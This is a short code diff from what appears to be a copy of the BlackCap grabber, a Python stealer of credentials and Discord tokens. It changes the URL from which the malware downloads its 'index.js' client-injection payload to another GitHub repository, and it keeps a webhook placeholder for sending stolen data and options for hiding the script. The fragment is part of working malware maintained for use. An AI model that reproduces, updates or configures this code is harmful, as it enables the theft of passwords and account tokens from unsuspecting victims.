@@ -41,7 +41,7 @@ Passw = [];
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
-    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    'blackcap_inject_url': "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/index.js",
     'hide': '%_hide_script%',
     'ping': '%ping_enabled%',
     'pingtype': '%ping_type%',
